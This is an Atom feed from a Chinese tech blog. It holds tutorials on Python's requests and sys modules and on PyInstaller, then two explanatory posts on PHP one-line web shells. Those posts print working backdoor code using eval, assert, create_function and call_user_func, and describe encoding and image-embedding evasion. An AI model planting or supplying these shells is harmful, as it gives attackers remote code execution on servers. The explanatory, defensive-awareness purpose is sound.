<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦的小屋</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-25T16:08:48.502Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>晨曦</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>py requests库</title>
    <link href="http://example.com/2024/11/30/python/py-requests/"/>
    <id>http://example.com/2024/11/30/python/py-requests/</id>
    <published>2024-11-30T23:52:50.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>requests</code> 库是 Python 中一个用于发送 HTTP 请求的第三方库。它提供了一个简单、直观的 API，使得发送 HTTP 请求和处理响应变得非常容易。以下是对 <code>requests</code> 库的详细介绍：</p><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p><code>requests</code> 库旨在让 HTTP 请求变得简单。它基于 urllib3 库，但提供了更高级别的接口，使得开发者无需直接处理底层的套接字或连接池等细节。<code>requests</code> 库支持各种 HTTP 请求方法（如 GET、POST、PUT、DELETE 等），并允许自定义请求头、参数、超时设置等。</p><h3 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h3><p><code>requests</code> 库可以通过 Python 的包管理器 pip 进行安装。在命令行中运行以下命令即可：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure></div><h3 id="三、主要功能"><a href="#三、主要功能" class="headerlink" title="三、主要功能"></a>三、主要功能</h3><ol><li><p><strong>发送 HTTP 请求</strong>：</p><ul><li><code>requests.get(url, **kwargs)</code>：发送 GET 请求。</li><li><code>requests.post(url, data=None, json=None, **kwargs)</code>：发送 POST 请求，可以传递表单数据或 JSON 数据。</li><li><code>requests.put(url, data=None, **kwargs)</code>：发送 PUT 请求，用于更新资源。</li><li><code>requests.delete(url, **kwargs)</code>：发送 DELETE 请求，用于删除资源。</li><li>其他 HTTP 方法（如 HEAD、OPTIONS）也有相应的函数。</li></ul></li><li><p><strong>处理响应</strong>：</p><ul><li>响应对象包含了许多有用的方法和属性，如 <code>status_code</code>（状态码）、<code>headers</code>（响应头）、<code>text</code>（响应体，解码后的字符串）、<code>content</code>（响应体，原始的字节流）等。</li><li>可以使用 <code>response.json()</code> 方法将 JSON 格式的响应体解析为 Python 字典。</li></ul></li><li><p><strong>自定义请求</strong>：</p><ul><li>可以使用 <code>params</code> 参数传递 URL 查询参数。</li><li>可以使用 <code>headers</code> 参数自定义请求头。</li><li>可以使用 <code>cookies</code> 参数传递 cookies。</li><li>可以使用 <code>auth</code> 参数进行身份认证。</li><li>可以使用 <code>timeout</code> 参数设置请求超时时间。</li><li>可以使用 <code>proxies</code> 参数设置代理服务器。</li></ul></li><li><p><strong>会话对象</strong>：</p><ul><li>使用 <code>requests.Session()</code> 可以创建一个会话对象，用于保持某些参数（如 cookies 和 headers）的一致性，并在同一会话中发送多个请求。</li></ul></li><li><p><strong>异常处理</strong>：</p><ul><li><code>requests</code> 库提供了异常处理机制，可以捕获如 <code>requests.exceptions.RequestException</code>、<code>requests.exceptions.HTTPError</code>、<code>requests.exceptions.ConnectionError</code> 等异常。</li></ul></li></ol><h3 id="四、优点"><a href="#四、优点" class="headerlink" title="四、优点"></a>四、优点</h3><ul><li><strong>简单易用</strong>：<code>requests</code> 库的 API 设计简洁明了，使得发送 HTTP 请求和处理响应变得非常容易。</li><li><strong>功能强大</strong>：支持各种 HTTP 请求方法、自定义请求头、参数、超时设置等高级功能。</li><li><strong>自动处理 cookies</strong>：会话对象可以自动处理 cookies，使得在同一会话中发送多个请求时无需手动管理 cookies。</li><li><strong>异常处理</strong>：提供了丰富的异常处理机制，方便开发者捕获和处理各种网络请求异常。</li></ul><h3 id="五、示例"><a href="#五、示例" class="headerlink" title="五、示例"></a>五、示例</h3><p>以下是一个简单的示例，展示了如何使用 <code>requests</code> 库发送 GET 请求并处理响应：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 GET 请求</span></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.example.com/data&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查状态码</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="comment"># 获取响应体并解码为字符串</span></span><br><span class="line">    data = response.text</span><br><span class="line">    <span class="comment"># 或者使用 response.json() 方法解析 JSON 格式的响应体</span></span><br><span class="line">    <span class="comment"># data = response.json()</span></span><br><span class="line">    <span class="comment"># 处理数据...</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 处理错误状态码...</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Error:&#x27;</span>, response.status_code)</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="requests" scheme="http://example.com/tags/requests/"/>
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>py sys库</title>
    <link href="http://example.com/2024/11/30/python/py-sys/"/>
    <id>http://example.com/2024/11/30/python/py-sys/</id>
    <published>2024-11-30T23:34:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="导入-sys-模块"><a href="#导入-sys-模块" class="headerlink" title="导入 sys 模块"></a>导入 <code>sys</code> 模块</h3><p>要使用 <code>sys</code> 模块中的功能，首先需要导入它：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure></div><h3 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h3><h4 id="1-访问命令行参数"><a href="#1-访问命令行参数" class="headerlink" title="1. 访问命令行参数"></a>1. 访问命令行参数</h4><p><code>sys.argv</code> 是一个列表，包含了命令行参数。<code>sys.argv[0]</code> 是脚本的名称，<code>sys.argv[1:]</code> 是传递给脚本的参数。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Script name:&quot;</span>, sys.argv[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i, arg <span class="keyword">in</span> <span class="built_in">enumerate</span>(sys.argv[<span class="number">1</span>:], start=<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Argument <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;arg&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>如果你运行 <code>python script.py arg1 arg2</code>，输出将会是：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Script name: script.py</span><br><span class="line">Argument 1: arg1</span><br><span class="line">Argument 2: arg2</span><br></pre></td></tr></table></figure></div><h4 id="2-标准输入输出和错误"><a href="#2-标准输入输出和错误" class="headerlink" title="2. 标准输入输出和错误"></a>2. 标准输入输出和错误</h4><p><code>sys</code> 模块提供了三个与标准流相关的变量：<code>sys.stdin</code>（标准输入）、<code>sys.stdout</code>（标准输出）和 <code>sys.stderr</code>（标准错误）。你可以重定向这些流或者替换它们。</p><p>例如，将标准输出重定向到一个文件：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    sys.stdout = f</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This will be written to output.txt&quot;</span>)</span><br><span class="line">    sys.stdout = sys.__stdout__  <span class="comment"># 恢复原来的标准输出</span></span><br></pre></td></tr></table></figure></div><h4 id="3-退出程序"><a href="#3-退出程序" class="headerlink" title="3. 退出程序"></a>3. 退出程序</h4><p><code>sys.exit([arg])</code> 函数用于退出当前程序。如果提供了一个参数，则会被作为程序的退出状态码（0 表示成功，非0 表示失败）。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> some_error_condition:</span><br><span class="line">    sys.exit(<span class="number">1</span>)  <span class="comment"># 非零值表示错误</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.exit(<span class="number">0</span>)  <span class="comment"># 零值表示成功</span></span><br></pre></td></tr></table></figure></div><p>你也可以直接调用 <code>sys.exit()</code> 而不带参数，这等价于 <code>sys.exit(0)</code>。</p><h4 id="4-最大递归深度"><a href="#4-最大递归深度" class="headerlink" title="4. 最大递归深度"></a>4. 最大递归深度</h4><p><code>sys.setrecursionlimit(limit)</code> 函数允许你设置 Python 解释器的最大递归深度。默认深度通常是 1000，但这个值可以根据需要进行调整。不过，增加递归深度可能会导致栈溢出错误。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置最大递归深度为 2000</span></span><br><span class="line">sys.setrecursionlimit(<span class="number">2000</span>)</span><br></pre></td></tr></table></figure></div><h4 id="5-Python-版本信息"><a href="#5-Python-版本信息" class="headerlink" title="5. Python 版本信息"></a>5. Python 版本信息</h4><p><code>sys.version</code> 和 <code>sys.version_info</code> 提供了关于 Python 解释器版本的信息。<code>sys.version</code> 是一个字符串，而 <code>sys.version_info</code> 是一个命名元组，提供了更结构化的访问方式。</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version (string):&quot;</span>, sys.version)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Python version (info):&quot;</span>, sys.version_info)</span><br></pre></td></tr></table></figure></div><h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3><ul><li><code>sys.path</code>：一个列表，包含了模块搜索路径的字符串。你可以通过修改这个列表来影响模块的导入行为。</li><li><code>sys.modules</code>：一个字典，包含了所有已导入的模块。键是模块名，值是模块对象。</li><li><code>sys.platform</code>：一个字符串，表示运行 Python 解释器的操作系统平台。</li><li><code>sys.getsizeof(object)</code>：返回对象所占用的内存大小（以字节为单位），不包括对象引用的其他对象。</li><li><code>sys.settrace(tracefunc)</code> 和 <code>sys.gettrace()</code>：用于设置或获取全局跟踪函数，这通常用于调试目的。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="py库" scheme="http://example.com/tags/py%E5%BA%93/"/>
    
    <category term="sys" scheme="http://example.com/tags/sys/"/>
    
  </entry>
  
  <entry>
    <title>快速上手pyinstaller</title>
    <link href="http://example.com/2024/11/30/python/pyinstaller/"/>
    <id>http://example.com/2024/11/30/python/pyinstaller/</id>
    <published>2024-11-30T20:59:53.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h2 id="1-PyInstaller-安装"><a href="#1-PyInstaller-安装" class="headerlink" title="1. PyInstaller 安装"></a><strong>1. PyInstaller 安装</strong></h2><p>首先安装 PyInstaller：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pyinstaller</span><br></pre></td></tr></table></figure></div><p>验证安装是否成功：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --version</span><br></pre></td></tr></table></figure></div><hr><h2 id="2-基本用法"><a href="#2-基本用法" class="headerlink" title="2. 基本用法"></a><strong>2. 基本用法</strong></h2><h3 id="打包单个脚本"><a href="#打包单个脚本" class="headerlink" title="打包单个脚本"></a><strong>打包单个脚本</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>生成的文件会放在 <code>dist/your_script/</code> 目录下，包含可执行文件和依赖的多个文件。</li></ul><h3 id="打包为单个可执行文件"><a href="#打包为单个可执行文件" class="headerlink" title="打包为单个可执行文件"></a><strong>打包为单个可执行文件</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile your_script.py</span><br></pre></td></tr></table></figure></div><ul><li><code>--onefile</code> 将所有依赖和代码合并为一个独立的可执行文件。</li></ul><hr><h2 id="3-PyInstaller-常用选项"><a href="#3-PyInstaller-常用选项" class="headerlink" title="3. PyInstaller 常用选项"></a><strong>3. PyInstaller 常用选项</strong></h2><p>以下是常用选项的功能和用法：</p><h3 id="1-添加图标"><a href="#1-添加图标" class="headerlink" title="1. 添加图标"></a><strong>1. 添加图标</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --icon=your_icon.ico your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--icon</code>**：指定 <code>.ico</code> 图标文件，适用于 Windows。</li></ul><hr><h3 id="2-隐藏终端窗口"><a href="#2-隐藏终端窗口" class="headerlink" title="2. 隐藏终端窗口"></a><strong>2. 隐藏终端窗口</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--noconsole</code>**：适用于 GUI 程序，隐藏终端窗口（仅在 Windows 中有效）。</li></ul><hr><h3 id="3-指定额外依赖路径"><a href="#3-指定额外依赖路径" class="headerlink" title="3. 指定额外依赖路径"></a><strong>3. 指定额外依赖路径</strong></h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --paths=/path/to/extra/modules your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--paths</code>**：用于包含 Python 脚本未在标准路径下的模块或包。</li></ul><hr><h3 id="4-处理隐藏导入"><a href="#4-处理隐藏导入" class="headerlink" title="4. 处理隐藏导入"></a><strong>4. 处理隐藏导入</strong></h3><p>某些模块（如动态导入的模块）可能无法被自动检测到，需要手动指定：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --hidden-import=module_name your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--hidden-import</code>**：解决未检测的依赖模块。</li></ul><hr><h3 id="5-压缩可执行文件"><a href="#5-压缩可执行文件" class="headerlink" title="5. 压缩可执行文件"></a><strong>5. 压缩可执行文件</strong></h3><p>如果可执行文件体积较大，可以使用 UPX 压缩：</p><ol><li>安装 UPX。</li><li>使用以下命令：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --upx-dir=/path/to/upx your_script.py</span><br></pre></td></tr></table></figure></div></li></ol><hr><h3 id="6-调试模式"><a href="#6-调试模式" class="headerlink" title="6. 调试模式"></a><strong>6. 调试模式</strong></h3><p>在打包时开启调试模式以查看详细错误信息：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --debug=all your_script.py</span><br></pre></td></tr></table></figure></div><hr><h3 id="7-指定工作目录"><a href="#7-指定工作目录" class="headerlink" title="7. 指定工作目录"></a><strong>7. 指定工作目录</strong></h3><p>为避免污染当前目录，可以指定工作目录：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --workpath=/path/to/workdir your_script.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--workpath</code>**：指定临时文件的存放目录。</li></ul><hr><h2 id="4-打包结果文件说明"><a href="#4-打包结果文件说明" class="headerlink" title="4. 打包结果文件说明"></a><strong>4. 打包结果文件说明</strong></h2><ol><li>**<code>dist/</code>**：生成的可执行文件和相关资源。</li><li>**<code>build/</code>**：构建过程中产生的临时文件。</li><li><strong><code>.spec</code> 文件</strong>：PyInstaller 的配置文件，可手动修改以支持更复杂的需求。</li></ol><hr><h2 id="5-使用-spec-文件"><a href="#5-使用-spec-文件" class="headerlink" title="5. 使用 .spec 文件"></a><strong>5. 使用 <code>.spec</code> 文件</strong></h2><h3 id="生成-spec-文件"><a href="#生成-spec-文件" class="headerlink" title="生成 .spec 文件"></a>生成 <code>.spec</code> 文件</h3><p>在第一次运行 PyInstaller 时会自动生成 <code>.spec</code> 文件：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.py</span><br></pre></td></tr></table></figure></div><p>或手动创建：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --icon=your_icon.ico your_script.py</span><br></pre></td></tr></table></figure></div><h3 id="编辑-spec-文件"><a href="#编辑-spec-文件" class="headerlink" title="编辑 .spec 文件"></a>编辑 <code>.spec</code> 文件</h3><p>你可以修改 <code>.spec</code> 文件来配置：</p><ol><li><strong>数据文件</strong>（如图片、配置文件）：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">datas=[(<span class="string">&#x27;path/to/datafile&#x27;</span>, <span class="string">&#x27;destination_folder&#x27;</span>)]</span><br></pre></td></tr></table></figure></div></li><li><strong>隐藏导入</strong>：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">hiddenimports=[<span class="string">&#x27;module1&#x27;</span>, <span class="string">&#x27;module2&#x27;</span>]</span><br></pre></td></tr></table></figure></div></li></ol><h3 id="使用-spec-文件重新打包"><a href="#使用-spec-文件重新打包" class="headerlink" title="使用 .spec 文件重新打包"></a>使用 <code>.spec</code> 文件重新打包</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller your_script.spec</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-示例应用场景"><a href="#6-示例应用场景" class="headerlink" title="6. 示例应用场景"></a><strong>6. 示例应用场景</strong></h2><h3 id="简单脚本打包"><a href="#简单脚本打包" class="headerlink" title="简单脚本打包"></a><strong>简单脚本打包</strong></h3><p>假设有一个脚本 <code>hello.py</code>：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, PyInstaller!&quot;</span>)</span><br></pre></td></tr></table></figure></div><p>运行以下命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile hello.py</span><br></pre></td></tr></table></figure></div><p>生成的可执行文件位于 <code>dist/hello.exe</code>。</p><hr><h3 id="打包-GUI-程序"><a href="#打包-GUI-程序" class="headerlink" title="打包 GUI 程序"></a><strong>打包 GUI 程序</strong></h3><p>对于 Tkinter 或 PyQt5 程序，示例脚本 <code>gui_app.py</code>：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> Tk, Label</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">Label(root, text=<span class="string">&quot;Hello, GUI!&quot;</span>).pack()</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></table></figure></div><p>运行命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole --icon=app_icon.ico gui_app.py</span><br></pre></td></tr></table></figure></div><hr><h3 id="包含数据文件"><a href="#包含数据文件" class="headerlink" title="包含数据文件"></a><strong>包含数据文件</strong></h3><p>如果脚本依赖额外的数据文件：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># example.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">path = os.path.join(os.path.dirname(__file__), <span class="string">&#x27;config.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br></pre></td></tr></table></figure></div><p>命令：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --add-data <span class="string">&quot;config.txt;.&quot;</span> example.py</span><br></pre></td></tr></table></figure></div><ul><li>**<code>--add-data</code>**：格式为 <code>文件路径;目标目录</code>。</li></ul><hr><h2 id="7-常见问题与解决"><a href="#7-常见问题与解决" class="headerlink" title="7. 常见问题与解决"></a><strong>7. 常见问题与解决</strong></h2><ol><li><p><strong>运行时缺失模块</strong></p><ul><li>检查日志，使用 <code>--hidden-import</code> 添加缺失模块。</li></ul></li><li><p><strong>文件过大</strong></p><ul><li>启用 UPX 压缩。</li><li>检查是否有多余的依赖包。</li></ul></li><li><p><strong>路径问题</strong></p><ul><li>使用 <code>sys._MEIPASS</code> 获取运行时的临时路径：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line">path = os.path.join(sys._MEIPASS, <span class="string">&#x27;config.txt&#x27;</span>)</span><br></pre></td></tr></table></figure></div></li></ul></li></ol><hr><h2 id="8-完整命令模板"><a href="#8-完整命令模板" class="headerlink" title="8. 完整命令模板"></a><strong>8. 完整命令模板</strong></h2><p>综合多个参数的完整示例：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">pyinstaller --onefile --noconsole --icon=app_icon.ico --add-data <span class="string">&quot;config.txt;.&quot;</span> --hidden-import=pkg_resources.py2_warn --debug=all gui_app.py</span><br></pre></td></tr></table></figure></div><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="python" scheme="http://example.com/categories/python/"/>
    
    
    <category term="python打包" scheme="http://example.com/tags/python%E6%89%93%E5%8C%85/"/>
    
    <category term="pyinstaller" scheme="http://example.com/tags/pyinstaller/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马上</title>
    <link href="http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC1/"/>
    <id>http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC1/</id>
    <published>2024-11-11T20:10:52.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一句话木马是一种短小精悍的恶意代码，通常只有一行代码，但其功能却相当强大，能够利用一些漏洞，以上传文件、修改配置等方式将恶意代码植入到受害者服务器上，并通过特殊手法在服务器端执行，以达到入侵控制目的。以下是对一句话木马的详细讲解：</p><h3 id="一、一句话木马的工作原理"><a href="#一、一句话木马的工作原理" class="headerlink" title="一、一句话木马的工作原理"></a>一、一句话木马的工作原理</h3><p>一句话木马的工作原理主要基于代码注入和远程命令执行。攻击者通过在目标服务器上植入一句话木马，可以接收来自远程客户端的控制命令，并在服务器上执行这些命令。这些命令可以包括文件上传、下载、执行系统命令、读取数据库信息等。</p><p>具体来说，一句话木马通常包含以下几个部分：</p><ol><li><strong>接收数据</strong>：通过特定的函数（如<code>$_POST</code>、<code>$_GET</code>等）接收来自远程客户端的数据。</li><li><strong>执行命令</strong>：使用某些函数（如<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>等）执行接收到的数据中的命令。</li></ol><p>例如，一个典型的一句话木马可能看起来像这样：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>eval()</code>函数用于执行<code>$_POST[&#39;cmd&#39;]</code>中的PHP代码。攻击者可以通过向这个页面发送POST请求，并在请求中包含<code>cmd</code>参数来执行任意的PHP代码。</p><h3 id="二、一句话木马的变形与隐蔽性"><a href="#二、一句话木马的变形与隐蔽性" class="headerlink" title="二、一句话木马的变形与隐蔽性"></a>二、一句话木马的变形与隐蔽性</h3><p>为了绕过安全检测和提高隐蔽性，一句话木马出现了多种变形。这些变形可能包括使用不同的函数、编码方式、混淆技术等。例如：</p><ol><li><strong>使用不同的函数</strong>：除了<code>eval()</code>之外，攻击者还可以使用<code>assert()</code>、<code>create_function()</code>等函数来执行命令。</li><li><strong>编码与混淆</strong>：通过对一句话木马进行编码或混淆处理，可以使其更加难以被检测和识别。例如，可以使用Base64编码、URL编码等方式对代码进行编码处理。</li><li><strong>隐藏在图片中</strong>：攻击者还可以将一句话木马隐藏在图片文件中，并通过特定的方式将其解析为PHP代码执行。这种技术被称为“图片马”。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="一句话木马" scheme="http://example.com/categories/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>一句话木马下</title>
    <link href="http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC2/"/>
    <id>http://example.com/2024/11/11/web/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC2/</id>
    <published>2024-11-11T20:10:52.000Z</published>
    <updated>2024-12-25T16:08:48.502Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="一、利用不同函数"><a href="#一、利用不同函数" class="headerlink" title="一、利用不同函数"></a>一、利用不同函数</h3><ol><li><p><strong>assert()函数</strong>：</p><ul><li>写法：<code>&lt;?php assert($_POST[&#39;cmd&#39;]); ?&gt;</code></li><li>分析：<code>assert()</code>函数同样可以执行PHP代码，但不易被标记为恶意代码，因此常被用于一句话木马的变形中。</li></ul></li><li><p><strong>create_function()函数</strong>：</p><ul><li>写法：<code>&lt;?php $fun=create_function(&#39;&#39;,$_POST[&#39;a&#39;]);$fun(); ?&gt;</code></li><li>分析：<code>create_function()</code>函数可以动态创建一个匿名函数，并执行其中的代码。通过传递恶意代码作为参数，可以实现一句话木马的功能。</li></ul></li><li><p><strong>call_user_func()函数</strong>：</p><ul><li>写法：<code>&lt;?php @call_user_func(assert,$_POST[&#39;a&#39;]); ?&gt;</code></li><li>分析：<code>call_user_func()</code>函数可以调用一个指定的函数，并传递参数。在这里，它被用来调用<code>assert()</code>函数并执行恶意代码。</li></ul></li></ol><h3 id="二、混淆技术"><a 